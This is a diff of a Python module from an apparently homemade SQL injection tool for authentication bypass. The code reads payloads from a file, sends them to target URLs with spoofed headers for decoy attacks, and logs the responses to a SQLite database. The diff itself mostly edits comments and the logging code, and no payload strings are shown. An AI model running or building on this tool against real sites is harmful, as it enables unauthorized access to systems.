@@ -6,7 +6,7 @@ from colorama import Fore,init
 from datetime import datetime
 # import sock
 import sqlite3
-from database import create_database_for_Captures
+# from database import create_database_for_Captures
 from headers import Prepare_the_headers,headers,header
 
 
@@ -16,8 +16,13 @@ attack_type = "authentication bypass SQL injection"
 
 """ 
               Reference : https://github.com/payloadbox/sql-injection-payload-list 
-              for The payloads"""
+              for The payloads
+              """
 
+"""Reference for the header inspiration:
+https://stackoverflow.com/questions/70017732/how-to-change-the-ip-address-in-the-url """
+
+"""This is When we want to attack with decoy and use spoofing """
 
 
 ####################################33
@@ -40,6 +45,7 @@ headers = {
 async def auth_SQL_inj_HEADER(urls):
     """This is the authentication bypass sql injection block. it occurs when the input datas are not validated and attacker can inject its own code to the database and bypass the authentication"""
     try:
+        """This is the main block of our exploit program which sending the payloads. """
         global pattern,htmlpattern #* use these two variables as 
         done = False #* Set done flag as false
         filename = "auth_bypass.txt" #* opens the file of the sqlinjection payload
@@ -109,17 +115,35 @@ async def auth_SQL_inj_HEADER(urls):
                 else:
                     print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection","\n|Headers:|",header)
             
-            await create_database_for_Captures()
-            conn = sqlite3.connect("ResultCap.db")
-            cur = conn.cursor()
+        # await create_database_for_Captures()
+        conn = sqlite3.connect("ResultCap.db")
+        cur = conn.cursor()
 
-            sql = "INSERT INTO Datas (Data) VALUES (?)"
-            values = [(ack.text,), (str(headers),), (str(ack.status_code),), (str(vuln,),), (str(htmlVULN),), (str(errword),), (str(word),), (str(req.status_code),), (str(ack.text),)]
+        # Check if the "attacktype" column already exists in the table
+        # cur.execute("PRAGMA table_info(Datas)")
+        # columns = cur.fetchall()
+        # column_names = [column[1] for column in columns]
 
-            cur.executemany(sql, values)
+        # Insert the values into the table
+        ################################################################################################
+        """Add the needed values such as the attack type of the SQL injection and the final result to the database. """
+        sql = "INSERT INTO Datas (Data, attacktype) VALUES (?, ?)"
+        values = [
+            (str(ack.text), attack_type),
+            (str(headers), attack_type),
+            (str(ack.status_code), attack_type),
+            (str(vuln), attack_type),
+            (str(htmlVULN), attack_type),
+            (str(errword), attack_type),
+            (str(word), attack_type),
+            (str(req.status_code), attack_type),
+            (str(ack.text), attack_type)
+        ]
 
-            conn.commit()
-            conn.close()
+        cur.executemany(sql, values)
+        conn.commit()
+        conn.close()
+        #############################################################################################################
         # capturesAUTHBYPASS.append(headers)
         # capturesAUTHBYPASS.append(ack.status_code)
         # capturesAUTHBYPASS.append(vuln)
@@ -131,15 +155,12 @@ async def auth_SQL_inj_HEADER(urls):
         
                 
         # capturesAUTHBYPASS.append(str(htmlVULN))
-        # capturesAUTHBYPASS.append(str(vuln))
-        
-                        
+        # capturesAUTHBYPASS.append(str(vuln))         
                     
     except Exception as e:
         print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
         
     except KeyboardInterrupt:
-        # print(f"[{datetime.now()}]","Exiting...")
         pass
         
     except ConnectionAbortedError as e:
